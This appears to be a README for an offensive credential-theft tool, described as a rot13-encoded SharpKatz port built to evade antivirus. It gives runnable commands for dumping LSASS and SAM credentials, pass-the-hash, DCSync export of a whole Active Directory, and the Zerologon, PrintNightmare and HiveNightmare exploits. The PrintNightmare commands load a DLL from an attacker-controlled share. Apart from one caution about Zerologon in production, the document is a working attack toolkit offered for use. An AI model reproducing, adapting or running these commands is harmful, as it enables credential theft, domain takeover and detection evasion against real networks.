# ldump_rot13: An encoded version of Sharpkatz with all static components stripped and reproduced for AV evasion.
# Binary evades detection at run time, but does not evade scanning of the binary at rest.
# Still more work to do.

Porting of mimikatz sekurlsa::logonpasswords,  sekurlsa::ekeys and lsadump::dcsync commands

## Usage

### Ekeys

```ldump_rot13.exe --Command ekeys```<br>
 list Kerberos encryption keys <br>
 <br>

### Msv

```ldump_rot13.exe --Command msv``` <br>
Retrive user credentials from Msv provider <br>
<br>

### Kerberos

```ldump_rot13.exe --Command kerberos```<br>
Retrive user credentials from Kerberos provider <br>
<br>

### Tspkg

```ldump_rot13.exe --Command tspkg```<br>
Retrive user credentials from Tspkg provider <br>
<br>

### Credman

```ldump_rot13.exe --Command credman```<br>
Retrive user credentials from Credman provider <br>
<br>

### WDigest

```ldump_rot13.exe --Command wdigest```<br>
Retrive user credentials from WDigest provider <br>
<br>

### Logonpasswords

```ldump_rot13.exe --Command logonpasswords```<br>
Retrive user credentials from all providers <br>
<br>

### List shadowcopies

```ldump_rot13.exe --Command listshadows```<br>
Enumerate shadowcopies with NtOpenDirectoryObject and NtQueryDirectoryObject<br>
<br>

### Lsadumpsam

```ldump_rot13.exe --Command dumpsam --System \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM --Sam \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM```<br>
Dump credential from provided sam database<br>
<br>

### Pth

```ldump_rot13.exe --Command pth --User username --Domain userdomain --NtlmHash ntlmhash```<br>
Perform pth to create a process under userdomain\username credential with ntlm hash of the user's password<br>
<br>
```ldump_rot13.exe --Command pth --User username --Domain userdomain --Rc4 rc4key```<br>
Perform pth to create a process under userdomain\username credential user's rc4 key<br>
<br>
```ldump_rot13.exe --Command pth --Luid luid --NtlmHash ntlmhash```<br>
Replace ntlm hash for an existing logonsession <br>
<br>
```ldump_rot13.exe --Command pth --User username --Domain userdomain --NtlmHash ntlmhash --aes256 aes256```<br>
Perform pth to create a process under userdomain\username credential with ntlm hash of the user's password and aes256 key <br>
<br>

### DCSync

```ldump_rot13.exe --Command dcsync --User user --Domain userdomain --DomainController dc```<br>
Dump user credential by username <br>
<br>
```ldump_rot13.exe --Command dcsync --Guid guid --Domain userdomain --DomainController dc```<br>
Dump user credential by GUID <br>
<br>
```ldump_rot13.exe --Command dcsync --Domain userdomain --DomainController dc```<br>
Export the entire dataset from AD to a file created in the current user's temp forder<br>
<br>
```ldump_rot13.exe --Command dcsync --User user --Domain userdomain --DomainController dc --AuthUser authuser --AuthDomain authdomain --AuthPassword authuserpassword```<br>
Dump user credential by username using alternative credentials<br>
<br>
```ldump_rot13.exe --Command dcsync --Guid guid --Domain userdomain --DomainController dc --AuthUser authuser --AuthDomain authdomain --AuthPassword authuserpassword```<br>
Dump user credential by GUID using alternative credentials<br>
<br>
```ldump_rot13.exe --Command dcsync --Domain userdomain --DomainController dc --AuthUser authuser --AuthDomain authdomain --AuthPassword authuserpassword```<br>
Export the entire dataset from AD to a file created in the current user's temp forder using alternative credentials<br>
<br>

### Zerologon

No reference to logoncli.dll, using the direct rpc call works even from a [non-domain joined workstation](https://twitter.com/gentilkiwi/status/1306178689630076929)

```ldump_rot13.exe --Command zerologon --Mode check --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$```<br>
Perform Zerologon check <br>
<br>
```ldump_rot13.exe --Command zerologon --Mode exploit --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$```<br>
Perform Zerologon attack <br>
<br>
```ldump_rot13.exe --Command zerologon --Mode auto --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$ --Domain testlab2.local --User krbtgt --DomainController WIN-NSE5CPCP07C.testlab2.local```<br>
Perform Zerologon attack and dump user credential by username <br>
<br>
```ldump_rot13.exe --Command zerologon --Mode auto --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$ --Domain testlab2.local --Guid guid --DomainController WIN-NSE5CPCP07C.testlab2.local```<br>
Perform Zerologon attack and dump user credential by GUID <br>
<br>
```ldump_rot13.exe --Command zerologon --Mode auto --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$ --Domain testlab2.local --DomainController WIN-NSE5CPCP07C.testlab2.local```<br>
Perform Zerologon attack and export the entire dataset from AD to a file created in the current user's temp forder<br>
<br>
Note: Do not use zerologon in a production environment or at least plan for recovery actions which are detailed [here](https://github.com/dirkjanm/CVE-2020-1472) 

### PrintNightmare CVE-2021-1675 - CVE-2021-34527

```ldump_rot13.exe --Command printnightmare --Target dc --Library \\\\mycontrolled\\share\\fun.dll```<br>
Perform PrintNightmare attack <br>
<br>
```ldump_rot13.exe --Command printnightmare --Target dc --Library \\\\mycontrolled\\share\\fun.dll --AuthUser user --AuthPassword password --AuthDomain dom```<br>
Perform PrintNightmare attack with provided credentials<br>
<br>

### HiveNightmare CVE-2021-36934

```ldump_rot13.exe --Command hiveghtmare```<br>
Exploit HiveNightmare vulnerability selecting the first available shadowcopy <br>
<br>
